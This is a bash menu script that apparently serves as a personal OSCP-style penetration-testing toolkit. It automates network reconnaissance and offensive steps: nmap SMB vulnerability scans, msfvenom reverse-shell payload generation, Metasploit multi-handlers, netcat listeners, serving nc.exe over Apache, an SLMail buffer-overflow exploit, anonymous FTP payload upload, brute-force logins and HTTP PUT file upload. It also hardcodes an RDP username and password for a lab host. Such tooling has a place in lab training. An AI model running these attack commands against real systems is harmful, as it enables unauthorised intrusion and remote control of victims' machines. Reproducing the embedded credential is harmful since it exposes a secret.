#!/bin/bash
#Prereqs 
clear
updatedb
echo "-------------NETWORK INFO----------------------"
ifconfig | grep inet
#searchsploit --update 
echo""
echo "[*] Starting Apache services...."
service apache2 start

func_Setup_WEBDAV_SMB_Server_Over_HTTP(){
mkdir /var/www/webdav
chown -R www-data:www-data /var/www
a2enmod dav
a2enmod dav_fs
echo "Add this to /etc/apache2/apache2.conf

Alias /webdav /var/www/webdav

<Directory /var/www/webdav>
DAV On
</Directory>

"
echo "[!] Once added run apache2 service restart"

}

func_Setup_ReverseNC_Shells(){
echo "[*] Moving NC to apache2 web server dir"
cp /usr/share/windows-binaries/nc.exe /var/www/html/nc.exe
service apache2 start
echo "[*] Starting Apache service"
}

func_ZoneXFer(){
echo "Enter Domain Name to Search: "
read DomainName
echo ""
echo "[*] Launching OSCP Scripted DNS Tool (host -l)"
echo ""
for server in $(host -t ns $DomainName | cut -d" " -f4); do
	host -l $1 $server | grep "has address"
done
echo ""
echo "[*] Launching dnsrecon DNS Tool"
echo ""
dnsrecon -d $DomainName -t axfr
echo ""
echo "[*] Launching dnsenum DNS Tool"
echo ""
dnsenum $DomainName
}

func_HTML_Domain_Scrape(){
echo "Enter file path of html file to scrape Domains from: "
read HTMLFILE
grep "href=" $HTMLFILE | cut -d "/" -f 3 | grep "\." | cut -d '"' -f 1 |sort -u
}

func_PingSweep(){
echo "Enter 1st 3 octets (ie 192.168.0.): "
read FirstThreeOctects
echo "Enter Last octet start Range (ie 1 ): "
read SLastORange
echo "Enter Last octet end Range (ie 254 ): "
read ELastORange
for ip in $(seq $SLastORange $ELastORange);do
ping -c 1 $FirstThreeOctects$ip | grep "bytes from" | cut -d" " -f 4
done
}

func_NMAP_MENU(){
while true
do
echo "NMAP Menu"
echo ""
echo "0) Redo IP/RANGE/CIDR"
echo "1) nmap -p 135,445 {Your Range/CIDR Range} --open"
echo "2) nmap -p 139,445 --script smb-enum-users {Your Range/CIDR Range}"
echo "3) nmap -p 139,445 --script=smb-check-vulns --script-args=unsafe=1 {Your Range/CIDR Range}"
echo "4) nmap -sU --open -p 161(SNMP) {Your Range/CIDR Range}"
echo "5) nmap -sN -F -A -O -T4 {Your Range/CIDR Range} (Scan 100 MOST COMMON PORTS)"
echo "6) nmap --script={ScriptName} {Your Range/CIDR Range} (Scan using Nmap Script)"
echo "7) Use Nmap Scan to do ScreenCaptures of Visual Services (Http,vnc,rdp)"
echo "8) nmap an IP for shares and listable contents"
echo ""
echo "99) Goto Main"
echo ""
echo "Enter Selection: "
read Option
case "$Option" in 
0)
echo "Enter IP or CIDR or Range: "
read RangeCIDR
func_NMAP_MENU
;;
1) 
echo "Enter NMAP output file name to be saved under /root/(NAME.xml): "
read NMAPFile
nmap -v -O -p 135,445 $RangeCIDR --open -oX /root/135_445_Open.xml -oX $NMAPFile
func_NMAP_MENU
;;
2)
echo "Enter NMAP output file name to be saved under /root/(NAME.xml): "
read NMAPFile
nmap -v -O -p 139,445 --script smb-enum-users $RangeCIDR --open -oX $NMAPFile
func_NMAP_MENU
;;
3) 
echo "Enter NMAP output file name to be saved under /root/(NAME.xml): "
read NMAPFile
nmap -v -O -p 139,445 --script=smb-check-vulns --script-args=unsafe=1 $RangeCIDR --open -oX $NMAPFile
func_NMAP_MENU
;;
4) 
echo "Enter NMAP output file name to be saved under /root/(NAME.xml): "
read NMAPFile
nmap -v -O -sU --open -p 161 $RangeCIDR -oX $NMAPFile
func_NMAP_MENU
;;
5) 
echo "Enter NMAP output file name to be saved under /root/(NAME.xml): "
read NMAPFile
nmap -v -O -sN -F -A -O -T4 $RangeCIDR --open -oX $NMAPFile
func_NMAP_MENU
;;
6) 
echo "Enter NMAP output file name to be saved under /root/(NAME.xml): "
read NMAPFile
echo "List of Scripts for NMAP"
echo""
echo "Enter Search Term else all will be listed: "
read SearchTerm
echo "[*] Searching /usr/share/nmap/scripts/"
ls -l /usr/share/nmap/scripts/ | grep $SearchTerm
echo ""
echo "Enter the name of the script to use (or 'all' option is HailMarry (SLOW,event for single IP)): "
read NMAPScript
echo""
echo "Enter port numbers (ie 25,445): "
read Ports
echo "Enter IP info to target (ie CIDR,Range, Single IP): "
read targets
echo ""
echo "[*] Command used was: nmap -v -O --script=/usr/share/nmap/scripts/"$NMAPScript" -p "$Ports" "$targets" -oX "$NMAPFile
echo ""
nmap -v -O --script=/usr/share/nmap/scripts/$NMAPScript -p $Ports --open $targets -oX $NMAPFile
echo ""
echo "[*] Command used was: nmap -v -O --script=/usr/share/nmap/scripts/"$NMAPScript" -p "$Ports" --open "$targets" -oX "$NMAPFile
echo "[!] Script usage below"
cat /usr/share/nmap/scripts/$NMAPScript | grep "\-\-"
func_NMAP_MENU
;;
7)
func_ScreenCap_Scan
func_NMAP_MENU
;;
8)
echo "Enter IP to scan: "
read IP
echo "[!] Running: 'nmap -p 445" $IP "--script smb-enum-shares,smb-ls' in another tab..."
nmap -p 445 $IP --script smb-enum-shares,smb-ls
func_NMAP_MENU
;;
99) func_MAIN
;;
esac
done
}

func_Exploits_Menu(){
echo "EXPLOITS Menu"
echo ""
echo "1) Start Netcat Listener"
echo "2) Send SLMAIL_BO_RCE"
echo ""
echo "Enter Selection: "
read Option
case "$Option" in 
1)
echo "Enter Identifier for new Listener Tab name: "
read targetinfo
echo "Enter Lport call home port: "
read lport
gnome-terminal --tab --title="ncat_Listener"$targetinfo -- nc -lvp $lport
func_MAIN
;;
2)
python Scripts/SLMAIL_BO_RCE.py
func_MAIN
;;
*)
func_MAIN
;;
esac
}

func_Setup_Apache2_Download(){
service apache2 start
echo "Enter Port to open: "
read port
ufw allow in $port
echo "Enter File path to move file to /var/www/html from: "
read FilePath
cp $FilePath /var/www/html/$FilePath
}

func_MSFVEnom_Menu(){
service apache2 start
LHOST=$(hostname -I |cut -d" " -f2)
echo "MSFVENOM Menu"
echo "Payloads List"
echo "[*] LHOST is "$LHOST
echo ""
echo "00) Select/Change Payload"
echo "0) Setup Apache2 for file download"
echo "1) Generate Windows Reverse SHELLCODE"
echo "2) Generate Reverse tcp Shell exe"
echo "3) Generate CUSTOM PAYLOAD"
echo "4) Generate CUSTOM PAYLOAD and Handler"
echo "5) Generate Unique String of size N (Pattern_Create)" 
echo "6) Get Pattern Offset"
echo "7) Search for MSF Payload"
echo "8) Search for MSF Payload Format"
echo ""
echo "99) to goto MAIN"
echo ""
echo "Enter Selection: "
read Option
case "$Option" in
00)
echo "Search Term for Payload: "
read searchterm
echo "[*] Searching will disaply results below..."
msfvenom -l payloads | grep $searchterm
echo "Enter Payload path(nc=windows/shell_reverse_tcp): "
read payload
;;
0)
func_Setup_Apache2_Download
func_MSFVEnom_Menu
;;
1)
echo "Enter Lport call home port: "
read lport
echo "Enter byte code to exclude(ie \x00\x0a\x0d\x20): "
read Bytesofcode
echo "[*] Using ... msfvenom -p $payload LHOST=$LHOST LPORT=$lport -f c -a x86 --platform windows -b "$Bytesofcode" -e x86/shikata_ga_nai"
msfvenom -p $payload LHOST=$LHOST LPORT=$lport -f c -a x86 --platform windows -b "$Bytesofcode" -e x86/shikata_ga_nai
ifconfig tap0
func_MSFVEnom_Menu
;;
2)
echo "Enter Lport call home port: "
read lport
echo "Enter Bin Name: "
read BinName
msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows LHOST=$LHOST LPORT=$lport -f exe > /root/$BinName
echo "[+] File saved at /root/$BinName"
func_MSFVEnom_Menu
;;
3)
commandlinearg="msfvenom"
echo "Enter LHOST call home IP: "
read lhost
commandlinearg+=" LHOST="$lhost

echo "[+] "$commandlinearg
echo "Enter Lport call home port: "
read lport
commandlinearg+=" LPORT="$lport

echo "[+] "$commandlinearg
echo ""
echo "Payloads Ref's:"
echo "Linux=linux/x86/shell_reverse_tcp"
echo "Windows=windows/shell_reverse_tcp"
echo "Tomcat/jsp=java/jsp_shell_reverse_tcp"
echo "JavaServerPage=LHOST LPORT -p java/jsp_shell_reverse_tcp --platform windows -o /root/MSFV_java4444.jsp"
echo ""
echo "Search Term to look for in Payload title: "
read searchterm
echo "[*] Search results below...please wait for prompt"
msfvenom -l payloads | grep $searchterm

echo "[+] "$commandlinearg
echo "Enter Payload Path (nc=windows/shell_reverse_tcp): "
read payload
commandlinearg+=" -p "$payload

echo "[+] "$commandlinearg
echo "[*] Generating List of Payload Formats...please wait for prompt"
msfvenom -l formats
echo "Payloads Ref's:"
echo "Linux=-f elf"
echo ""
echo "Enter Payload format: "
read format
commandlinearg+=" -f "$format

echo "[+] "$commandlinearg
echo "[*] Generating List of Payload Platforms to compile for...please wait for prompt"
msfvenom -l platforms
echo "Enter Payload Architiecture: "
read platform
commandlinearg+=" --platform "$platform
echo ""
commandlinearg+=" -o /root/MSFV_"$platform$lport"."$format
echo "[+] Running this command:" $commandlinearg
;;
4)
commandlinearg="msfvenom"
echo "Enter LHOST call home IP: "
read lhost
commandlinearg+=" LHOST="$lhost

echo "[+] "$commandlinearg
echo "Enter Lport call home port: "
read lport
commandlinearg+=" LPORT="$lport

echo "[+] "$commandlinearg
echo ""
echo "Payloads Ref's:"
echo "Linux=linux/x86/shell_reverse_tcp"
echo "Windows=windows/shell_reverse_tcp"
echo "Tomcat/jsp=java/jsp_shell_reverse_tcp"
echo ""
echo "Search Term to look for in Payload title: "
read searchterm
echo "[*] Search results below...please wait for prompt"
msfvenom -l payloads | grep $searchterm

echo "[+] "$commandlinearg
echo "Enter Payload Path (nc=windows/shell_reverse_tcp): "
read payload
commandlinearg+=" -p "$payload

echo "[+] "$commandlinearg
echo "[*] Generating List of Payload Formats...please wait for prompt"
msfvenom -l formats
echo "Payloads Ref's:"
echo "Linux=-f elf"
echo ""
echo "Enter Payload format: "
read format
commandlinearg+=" -f "$format

echo "[+] "$commandlinearg
echo "[*] Generating List of Payload Platforms to compile for...please wait for prompt"
msfvenom -l platforms
echo "Enter Payload Architiecture: "
read platform
commandlinearg+=" --platform "$platform
echo ""
commandlinearg+=" -o /root/MSFV_"$platform$lport"."$format
echo "[+] Running this command:" $commandlinearg
echo ""
echo "[*] Generating msf rc file to run from msfconsole at /tmp/handler.rc"
echo ""
echo "[!] Payload at: /root/MSFV_"$platform"."$format
echo ""
echo "[*] Script looks like: 
use exploit/multi/handler
set PAYLOAD "$payload"
set LHOST "$lhost"
set LPORT "$lport"
set ExitOnSession false
exploit -j
"
echo "
use exploit/multi/handler
set PAYLOAD "$payload"
set LHOST "$lhost"
set LPORT "$lport"
set ExitOnSession false
exploit -j
">/tmp/handler.rc
gnome-terminal --tab --title="MSF MultiHandler"$lport -- msfconsole -r /tmp/handler.rc
gnome-terminal --tab --title="MSF Venom" -- $commandlinearg
echo ""
echo ""
echo ""
func_MSFVEnom_Menu
;;
5)
echo "Enter Size of unique string to generate: "
read size
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l $size
func_MSFVEnom_Menu
;;
6)
echo "Enter byte size BOF array in digits: "
read bytesize
echo "Enter memory address of EIP reg in when BOF executed(in digitsw): "
read EIP
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb $bytesize -q $EIP
func_MSFVEnom_Menu
;;
7)
clear
echo "Search Term to look for in Payload title: "
read searchterm
echo "[*] Search results below...please wait for prompt"
msfvenom -l payloads | grep $searchterm
func_MSFVEnom_Menu
;;
8)
clear
msfvenom -l formats
func_MSFVEnom_Menu
;;
99)
func_MAIN
;;
*)
func_MSFVEnom_Menu
;;
esac
	
}

func_Exploit_Search(){
echo "Exploit SEARCH Menu"
echo ""
echo "0) Search Based on NMAP Script"
echo "1) Search Based on Search Term(s)"
echo "99) Goto Main"
echo ""
echo "Enter Selection: "
read Option
case "$Option" in
0)
echo "Enter Filepath to NMAP xml output file: "
read filepath
echo "[*] Sending findings to /root/Vulns.txt"
searchsploit -x --nmap "$filepath" --colour --exclude="Denial" -w > /root/Vulns.txt
echo "[!] Ouput sent to /root/Vulns.txt"
func_Exploit_Search
;;
1)
echo "Enter terms to search for (space seperated per term): "
read terms
searchsploit "$terms" --colour --exclude="Denial" -w
func_Exploit_Search
;;
99)
func_MAIN
;;
*)
func_Exploit_Search
;;
esac
}

func_ScreenCap_Scan(){
echo "Enter location full path to NMAP xml file with http/rdp/vnc port scans to screencap: "
read Option	
gnome-terminal --tab --title="ScreenCap Session" --eyewitness -x $Option --headless --rdp --vnc --show-selenium --timeout 10
}

func_MAIN(){
echo "Main Menu"
echo ""
echo "-- Passive Recon Phase --"
echo ""
echo "1) DNS Enum (Zone Xfer)"
echo "2) Scrape Domaind from HTML page (used after wget domain.html)"
echo ""
echo "-- Active Recon Phase --"
echo ""
echo "3) Ping Sweep (Network ICMP Scan)"
echo "4) NMAP MENU"
echo "5) NBTScan (Netbios Name Server Scanner)"
echo ""
echo "-- Conenct to Client (Info gather)--"
echo""
echo "6) rpcclient (great 4 null session)"
echo "7) enum4linux (null smb/rpc session of box info grab)"
echo "8) Nc to clear text IP and port"
echo "9) SNMP Walk"
echo ""
echo "-- Payloads/Exploit --"
echo ""
echo "10) GOTO MSFVENOM and Exploit Dev Menu"
echo "11) Start netcat Listener"
echo "12) Start Metasploit MultiHandler"
echo "13) GOTO EXPLOITS Menu"
echo "14) GOTO Search For Exploits Menu"
echo ""
echo "-- Misc --"
echo ""
echo "15) Setup Native WEBDAV Sevrer on Apache"
echo "16) Attempt FTP anon Login and Payload Upload"
echo "17) Generate Wordlist from Webpage"
echo "18) Launch Online Brute Force Login"
echo "19) Setup Port Forward with 'rinetd'"
echo "20) Launch Web Server Dir BruteForcer"
echo "21) HTTP PUT File to a Web Server"
echo ""
echo "--Tasks Sub-Menu--"
echo ""
echo "00) RDP to test windows machine (10.11.20.153)"
echo "55) Restart OpenVPN"
echo "66) Tail Apache Access log"
echo "77) Launch Sparta"
echo "88) Take a ScreenCapture"
echo "99) EXIT SCRIPT"
echo ""
echo "Enter Selection: "
read Option
case "$Option" in 
00)
gnome-terminal --tab --title="RDP Session" -- rdesktop 10.11.20.153 -u "offsec" -p "ZAQvGC9MpjO" -g 85%
clear
func_MAIN
;;
88)
echo "Enter Image name/Dexcription (with file extension): "
read FileName
echo "[!] Pull up window you wish to capture count down 10 seconds..."
echo "[*] The courser will change to cross when ready"
sleep 9
echo "[*] Computer Ready!!"
import /root/Pictures/$FileName
echo "[*] Saved to /root/Pictures/$FileName"
sleep 1
func_MAIN
;;
1) func_ZoneXFer
func_MAIN
;;
3) func_PingSweep
func_MAIN
;;
2) func_HTML_Domain_Scrape
func_MAIN
;;
4)
clear 
func_NMAP_MENU
func_MAIN
;;
5) 
echo "Enter IP Range(ie 1-154) to Scan: "
read IP
nbtscan $IP
func_MAIN
;;
6) 
echo "Enter IP to connect to: "
read IP
echo "Enter Username to auth with (hit enter for no pass): "
read UN
echo "Enter password to auth with (hit enter for no pass): "
read PW
if [ -z "$PW" ]
then
	rpcclient -U $UN -P $PW $IP
else
	rpcclient -N -U $UN $IP
fi
func_MAIN
;;
7) 
echo "Enter IP to connect to: "
read IP
enum4linux -v $IP
func_MAIN
;;
8) 
echo "Enter IP/Domain to connect to: "
read IP
echo "Enter PORT to connect to: "
read Port
gnome-terminal --tab --title="NCAT Bind Shell" -- nc -nv $IP $Port
func_MAIN
;;
9)
echo "MIBS"
echo ""
echo "1.3.6.1.2.1.25.4.2.1.2 Running processes"
echo "1.3.6.1.2.1.6.13.1.3 Open ports"
echo "1.3.6.1.2.1.25.6.3.1.2 Installed patchs"
echo ""
echo "Enter mib-value to SNMP tree (ie 1.3.6.1.2.1.25.4.2.1.2 for running processes): "
read MIBID
echo "Enter IP to connect to: "
read IP
echo "Enter SNMP version (ie v1,v2): "
read SNMPVer
gnome-terminal --tab --title="SNMP Walk"$IP -- snmpwalk -c public -$SNMPVer $IP $MIBID
func_MAIN
;;
10)
clear
func_MSFVEnom_Menu
func_MAIN
;;
11)
echo "Enter Lport call home port: "
read lport
gnome-terminal --tab --title="ncat_Listener"$lport -- nc -nlvp $lport
func_MAIN
;;
12)
LHOST=$(hostname -I |cut -d" " -f2)
echo "Enter Lport call home port: "
read lport
echo "[*] Generating msf rc file to run from msfconsole at /tmp/handler.rc"
echo ""
echo "[*] Script looks like: 
use exploit/multi/handler
set PAYLOAD windows/shell_reverse_tcp
set LHOST $LHOST
set LPORT $lport
set ExitOnSession false
exploit -j
"
echo "
use exploit/multi/handler
set PAYLOAD windows/shell_reverse_tcp
set LHOST $LHOST
set LPORT $lport
set ExitOnSession false
exploit -j
">/tmp/handler.rc
gnome-terminal --tab --title="MSF MultiHandler"$lport -- msfconsole -r /tmp/handler.rc
func_MAIN
;;
13)
func_Exploits_Menu
func_MAIN
;;
14)
clear
func_Exploit_Search
func_MAIN
;;
15)
func_Setup_WEBDAV_SMB_Server_Over_HTTP
func_MAIN
;;
16)
ftpFile="/root/ftpLogin.sh"
echo > $ftpFile
echo "Enter IP to FTP to: "
read FTPIP
echo "Enter Payload path with file: "
read payload
echo "open "$FTPIP >> $ftpFile
echo "anonymous">> $ftpFile
echo "anonymous">> $ftpFile
echo "bin">> $ftpFile
echo "GET "$payload>>$ftpFile
echo "bye">> $ftpFile
chmod 755 $ftpFile
gnome-terminal --tab --title="FTP Auto Anon Upload"$lport -- ftp -s:$ftpFile
func_MAIN
;;
17)
echo "Enter IP or domain to scrape for wordlist: "
read dest
cewl $dest -m 6 -w /root/cewl.txt 2> /dev/null
john --wordlist=cewl.txt --rules --stdout > cewljohned.txt
vari=$(ls | grep cewljohned.txt)
echo "[*] Created "$vari
rm cewl.txt
func_MAIN
;;
18)
gnome-terminal --tab --title="HYDRA Brute Force" -- xhydra
#medusa -h $httpauthPage -u $username -P $wordlist -M http -n 81 -m DIR:$httpWebDir -T 30
#hydra -l root 10.11.1.72 -t 4 ssh -P /root/wordlists/rockyou.txt
func_MAIN
;;
19)
echo "Enter Bind Address (RHOST IP/targets WAN IP): "
read RHOST
echo "Enter BindPort (RHOST OUTBOUND/targets egress port): "
read RPORT
echo "Enter connectaddress (LHOST/your IP): "
read LHOST
echo "Enter connectport (LPORT/your local port to acces the port redir on): "
read LPORT
echo $RHOST $RPORT $LHOST $LPORT>/etc/rinetd.conf
/etc/init.d/rinetd restart
func_MAIN
;;
20)
gnome-terminal --tab --title="Web Dir Brute Forcer" -- dirbuster
func_MAIN
;;
21)
clear
echo "Enter Local path to payload: "
read Path
echo "Enter Dest IP or Domain with http(s)://: "
read Dest
curl $Dest --upload-file $Path -v
echo ""
echo "[*] Command run is: curl $Dest --upload-file $Path"
echo "[!] Example : curl http://192.168.1.103/dav/ --upload-file /root/Desktop/curl.php -v"
func_MAIN
;;
55)
service openvpn stop
service openvpn start
echo "[*] Openvpn restarted"
func_MAIN
;;
66)
service apache2 start
gnome-terminal --tab --title="Apache Access.log TAIL" -- tail -f /var/log/apache2/access.log
func_MAIN
;;
77)
gnome-terminal --tab --title="Sparta" -- sparta
func_MAIN
;;
99) exit 0
;;
*)
echo "[!] INVALID INPUT"
func_MAIN
;;
esac
}

func_MAIN
